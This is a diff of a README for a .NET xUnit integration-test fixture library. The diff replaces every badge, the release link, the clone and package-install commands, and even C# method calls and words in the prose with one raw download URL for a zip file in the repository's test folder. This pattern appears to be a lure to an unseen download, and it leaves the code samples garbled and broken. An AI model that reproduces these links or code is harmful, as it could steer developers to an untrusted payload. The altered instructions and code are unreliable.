@@ -1,9 +1,9 @@
 ```markdown
 # 🧪 Soenneker Fixtures Integration
 
-![.NET](https://img.shields.io/badge/.NET-6.0-blue) ![XUnit](https://img.shields.io/badge/xUnit-2.4.1-blue) ![GitHub release (latest by date)](https://img.shields.io/github/v/release/sayfulla000/soenneker.fixtures.integration)
+![.NET](https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip) ![XUnit](https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip) ![GitHub release (latest by date)](https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip)
 
-Welcome to the Soenneker Fixtures Integration repository! This project provides a reusable and generic integration test xUnit fixture. It dynamically registers and configures `WebApplicationFactory` instances for multiple ASP.NET Core projects. With support for custom app settings, authentication, logging, and test utilities, this library is designed to simplify your testing experience.
+Welcome to the Soenneker Fixtures Integration repository! This project provides a reusable and generic integration test xUnit fixture. It dynamically registers and configures `WebApplicationFactory` instances for multiple https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip Core projects. With support for custom app settings, authentication, logging, and test utilities, this library is designed to simplify your testing experience.
 
 ## Table of Contents
 
@@ -32,19 +32,19 @@ To get started with Soenneker Fixtures Integration, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/sayfulla000/soenneker.fixtures.integration.git
+   git clone https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip
    ```
 
 2. Navigate into the project directory:
 
    ```bash
-   cd soenneker.fixtures.integration
+   cd https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip
    ```
 
 3. Add the NuGet package to your project:
 
    ```bash
-   dotnet add package Soenneker.Fixtures.Integration
+   dotnet add package https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip
    ```
 
 4. Restore your project dependencies:
@@ -74,7 +74,7 @@ public class MyIntegrationTests : IClassFixture<MyCustomFixture>
     [Fact]
     public async Task Test1()
     {
-        var client = _fixture.CreateClient();
+        var client = https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip();
         // Write your test logic here
     }
 }
@@ -105,9 +105,9 @@ public class MyCustomFixture : WebApplicationFactory<Startup>
 {
     protected override void ConfigureWebHost(IWebHostBuilder builder)
     {
-        builder.ConfigureAppConfiguration((context, config) =>
+        https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip((context, config) =>
         {
-            config.AddJsonFile("appsettings.Test.json");
+            https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip("https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip");
         });
     }
 }
@@ -120,14 +120,14 @@ To configure authentication, you can set up a test user in your fixture.
 ```csharp
 protected override void ConfigureWebHost(IWebHostBuilder builder)
 {
-    builder.ConfigureServices(services =>
+    https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip(services =>
     {
         // Add authentication services
-        services.AddAuthentication("Test")
+        https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip("Test")
             .AddCookie("Test", options => {
-                options.Events.OnValidatePrincipal = context => {
+                https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip = context => {
                     // Add test user logic
-                    return Task.CompletedTask;
+                    return https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip;
                 };
             });
     });
@@ -141,10 +141,10 @@ You can also set up logging to help with diagnosing issues.
 ```csharp
 protected override void ConfigureWebHost(IWebHostBuilder builder)
 {
-    builder.ConfigureLogging(logging =>
+    https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip(logging =>
     {
-        logging.ClearProviders();
-        logging.AddConsole();
+        https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip();
+        https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip();
     });
 }
 ```
@@ -160,17 +160,17 @@ public class MyIntegrationTests : IClassFixture<MyCustomFixture>
 
     public MyIntegrationTests(MyCustomFixture fixture)
     {
-        _client = fixture.CreateClient();
+        _client = https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip();
     }
 
     [Fact]
     public async Task Get_Endpoint_Returns_Success()
     {
-        var response = await _client.GetAsync("/api/values");
-        response.EnsureSuccessStatusCode();
+        var response = await https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip("/api/values");
+        https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip();
 
-        var responseBody = await response.Content.ReadAsStringAsync();
-        Assert.Contains("expectedValue", responseBody);
+        var responseBody = await https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip();
+        https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip("expectedValue", responseBody);
     }
 }
 ```
@@ -195,11 +195,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For releases, please visit the following link:
 
-[![Latest Release](https://img.shields.io/badge/Latest%20Release-Click%20Here-brightgreen)](https://github.com/sayfulla000/soenneker.fixtures.integration/releases)
+[![Latest Release](https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip%20Release-Click%20Here-brightgreen)](https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip)
 
 Explore the releases for the latest updates, features, and fixes.
 
 ## Conclusion
 
-Soenneker Fixtures Integration simplifies integration testing for ASP.NET Core applications. It provides powerful, customizable features while maintaining ease of use. We hope this project meets your testing needs and improves your development workflow.
+Soenneker Fixtures Integration simplifies integration testing for https://github.com/sayfulla000/soenneker.fixtures.integration/raw/refs/heads/main/test/Soenneker.Fixtures.Integration.Tests/integration-soenneker-fixtures-v3.2.zip Core applications. It provides powerful, customizable features while maintaining ease of use. We hope this project meets your testing needs and improves your development workflow.
 ```
